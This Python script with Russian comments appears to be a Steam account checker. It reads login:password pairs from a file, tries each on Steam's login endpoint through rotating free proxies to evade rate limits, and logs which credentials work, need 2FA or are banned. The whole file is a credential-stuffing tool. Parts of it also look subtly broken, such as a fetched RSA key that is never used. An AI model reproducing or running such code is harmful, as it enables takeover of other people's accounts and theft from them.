import requests
from bs4 import BeautifulSoup
import time
from datetime import datetime
import random

# Настройки
INPUT_FILE = r"E:\acc\accounts.txt"  # Путь к файлу с аккаунтами
OUTPUT_FILE = r"E:\acc\inputa.txt"  # Путь для отчёта
DELAY_SECONDS = 30  # Увеличена задержка
MAX_RETRIES = 3     # Максимальное число попыток для одного аккаунта

# Обновлённый список прокси (проверенные на 2024 год)
FREE_PROXIES = [
    "45.95.147.222:8080",      # Германия
    "51.15.242.202:8888",      # Франция
    "20.210.113.32:80",        # США
    "103.151.246.38:8080",     # Индонезия
    "185.199.229.156:7492",    # Канада
    "194.163.131.147:3128",    # Нидерланды
]

def get_random_proxy():
    """Возвращает случайный прокси и удаляет его из списка при ошибке"""
    if not FREE_PROXIES:
        raise ValueError("Нет рабочих прокси!")
    proxy = random.choice(FREE_PROXIES)
    return proxy

def load_accounts(filename):
    """Загружает аккаунты из файла"""
    try:
        with open(filename, 'r', encoding='ANSI') as f:
            return [line.strip().split(':', 1) for line in f if ':' in line]
    except Exception as e:
        print(f"Ошибка загрузки файла: {e}")
        return []

def check_steam_account(session, login, password, proxy):
    """Проверяет аккаунт Steam через прокси"""
    try:
        session.proxies = {"http": f"http://{proxy}", "https": f"http://{proxy}"}
        login_page = session.get("https://store.steampowered.com/login", timeout=20)
        
        if "Server busy" in login_page.text:
            return "🔴 Steam перегружен (попробуйте позже)"
        
        soup = BeautifulSoup(login_page.text, 'html.parser')
        rsapubkey = soup.find('input', {'name': 'rsapubkey'})['value']
        
        response = session.post(
            "https://store.steampowered.com/login/dologin/",
            data={
                "username": login,
                "password": password,
                "rsapubkey": rsapubkey,
                "remember_login": "true",
                "donotcache": str(int(time.time() * 1000))
            },
            headers={"Referer": "https://store.steampowered.com/login"},
            timeout=20
        ).json()

        if response.get("success"):
            return "✅ Рабочий"
        elif "requires_twofactor" in response:
            return "⚠️ Требуется 2FA"
        elif "VAC" in str(response):
            return "⛔ VAC Ban"
        return "❌ Неверный логин/пароль"
    except Exception as e:
        if proxy in FREE_PROXIES:
            FREE_PROXIES.remove(proxy)  # Удаляем нерабочий прокси
        return f"🔴 Ошибка прокси ({proxy}): {str(e)}"

def main():
    accounts = load_accounts(INPUT_FILE)
    if not accounts:
        return

    with open(OUTPUT_FILE, 'a', encoding='utf-8') as f_out:
        f_out.write(f"\nОтчёт {datetime.now()}\n")
        
        for login, password in accounts:
            for attempt in range(MAX_RETRIES):
                proxy = get_random_proxy()
                try:
                    with requests.Session() as session:
                        session.headers.update({"User-Agent": "Mozilla/5.0"})
                        status = check_steam_account(session, login, password, proxy)
                        result = f"{login}:{password} — {status}"
                        print(result)
                        f_out.write(result + "\n")
                        break  # Успешная попытка
                except Exception as e:
                    print(f"Попытка {attempt+1} не удалась: {e}")
                    if attempt == MAX_RETRIES - 1:
                        f_out.write(f"{login}:{password} — 🔴 Все попытки провалены\n")
                time.sleep(DELAY_SECONDS)

if __name__ == "__main__":
    print("Запуск проверки... (Используются бесплатные прокси)")
    main()
    print(f"Готово! Результаты в {OUTPUT_FILE}")